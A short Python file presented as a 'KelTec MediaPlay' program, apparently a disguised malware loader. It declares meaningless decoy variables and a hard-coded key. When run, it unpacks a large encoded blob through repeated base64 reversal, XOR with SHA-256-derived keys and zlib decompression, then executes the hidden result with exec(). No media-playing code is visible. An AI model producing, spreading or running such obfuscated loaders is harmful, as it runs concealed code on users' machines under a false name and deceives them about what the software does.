# -*- coding: utf-8 -*-
# KelTec MediaPlay 

_lx0_0 = 983189 ^ 907171
_lx1_1 = len("6bda35")
import zlib as _z,base64 as _b,hashlib as _h,sys as _s,os as _o
_lx2_2 = abs(-255109)
_lx3_3 = 747296 * 0
_lx4_4 = 783072 ^ 739922
_K = 'e9b8b2cce4a80e1800b7a32f304dd7bb0a80685f01f487489752a85636ff696e'
_M = 'X/G0nUKaAi54bODDQFfHhGNsoL/c10jHAtuMe0qnyK0BrOKTQYxQdHVgv8QQB5HWYzjwsNqAHpVf3oZ8EfWUpliv5M5H2FJ5dW6/'
_D = '==QTIsw/R6viL+tTwankd17Z7aSDdG9IdLygBJtV5GjIBaHopNDTTUWGfcsZbD5MBrqKBW0WKpXzKSwWXmN1Y7AIAY52NIB/QD5IWg+DsxtvEHSY4oilAnNJmtNRAcPk6GkJbGtFGEV+sAOPgSzs1l5I4uqOyQ7thSkqcjxhYmExxTUSYB9LxBtczJJUZ7gMUk09nrisC8Sk4hMug7LwXuZZgtCLwMjwrfPu1Rr4KClrLsqKkJ9XEfnTE9ZZSYSJDUpCd0lxFM0la20hXZMqdn0WO6zvz/ZCAlwt24ygjfdZjV9RozV420gjV79inLzt9RnYMwENEnas4rZWEsmjsJyOqL07qvJ37yZE4q5VfpYiQYHtt5Je2Ppr96LAnccW8jlVd7DvNfF7F8mP9FGeQYdyJGeO/piXYbn36KBuClDRcorZ7Gg3EvM1eWGQ1KkkPImbdFtr/CnK4RgVCEnxXtEYB8FMwMizoumXSteep/OgtLzOwefe9y2OKavPk69o4bHgtFnbRfYGmXCyQjwU3ePc8YC5amoPzveJ8DKY8CfgibXYjSLmsWMZ1yayCELf/T2QUeHrHVdiWG7UaFhmQnB1h3qyusrzAH9reDDTUWMrvVZ7tTkrHk4FiNP7g4p+Niimzz/r1izQbfke/nFtHNynNPqkDNaW1s6euyvoY6lEPEx+MK93m6RhsbW/nsgDsh+1oGacdgAErH+j7S1D8tIEVD9uPcWRucfUC+m4CjPU0yhUmXw8T2hbpwcBKvzOtZ5DSEX5vdfnmOcY0oZKo/srpGJWERl8GOIZC60vIrx4syc6rcKpEFwUxzSRwdJ9H59jT8osbxAN4TiXQ0gxsDy+doidMU/zOxlQMLcn0BqV9Yi3kgeiDWovYANs09qFP2qbQOfZt28a2hocd6EjS41eLXD/8mRYwHH2DtD6kzUY/rUNW1xmswx3vOVNEO142vLhZTwmsAusn3mVW+MyBI30JO47/J1SNiuhtPMnlCGU8A5PzkkHDyPg1RBKUMouyypF+CtZwt4sBrqu08gS/bsECYuq3ww+y9AUPgtg/eVlL0OO1Lm34NqSh7xcx1o86m00UZmUWIRwOKxCyOfgyBr+Xp8N93GeStdGq6oJhUPeozyl+2yD6PV6vqY3+Ii/0++vwkio9+GeouJC7QS+BEsHEcwZSsRRd55OeAnASbaHsenoD9jlMYd5PgDt81luUHGzUsw3cdxEBHTJgl8H/fQHptoHAVAyxviQaCw/TzauoUfyt0xiJaNEYuc/DwL05252SEjJgd88Vg1vsmEbJhVmPsfLbQEXRGCZP+UnALgRATirYP8+8QPpCg5cF68KMwMzBs72uTohSN75mLOw+5eywXTmFbjxLXyK+7JKP268zUhYqpOxeQHGR2IRqfS9ZsmcBGKJkx1dldl66zJ8/5Ohcy75PEVtag66UnShmA5b5EMO65kUscp7AOnDJw/GDk2prpJeWYVBv7VQfNIQDdWdLm4EviYNlFyISXomUSxmZEn9dpBELIgLKsamhYSCJavijOHEy/BNDH7aGAvUalNHUyQQm1grZ6Tu90xb24SBpUx4T3SK/Bf2YJHABnhaaYnM2P5LaHF1ZuHKFHwd5ZRIP/gvnaq69Twp+T5juWdm6gaG148I5nXE2L9amkGkwnj/kuOmvmVFMWKBvC8ZgyeAFBNlt9tYXtDNzMjmLr5fPUHRwB4t97W0IFDp8JtTvm2GML7RZVPVCCthApG2zPL2NxFxthPFEaMY8bUMsErTyOcIGwqJieZnmQsllbB4GwZjz7xBi2GQs2332PY3YaXP8/G0qqWnqSBVNJIakeachwEkrmxKBXM+89EY'

def _xr(d,k):
    kl=len(k);return bytes(d[i]^k[i%kl] for i in range(len(d)))
def _dk(sd,c):
    return _h.sha256((_K+sd+str(c)).encode('utf-8')).digest()
def _dc(s,c,sd):
    r=_b.b64decode(s[::-1]);return _z.decompress(_xr(r,_dk(sd,c))).decode('utf-8')
def _run():
    mk=_h.sha256(_K.encode('utf-8')).digest()
    meta=_xr(_b.b64decode(_M),mk).decode('utf-8').split(':',2)
    sd=meta[0];nc=int(meta[1])
    d=_D
    for c in range(nc-1,-1,-1):d=_dc(d,c,sd)
    idx=d.find('||')
    src=d[idx+2:] if idx!=-1 else d
    exec(compile(src,'<mediaplay>','exec'),{'__name__':'__main__','__file__':__file__})
_run()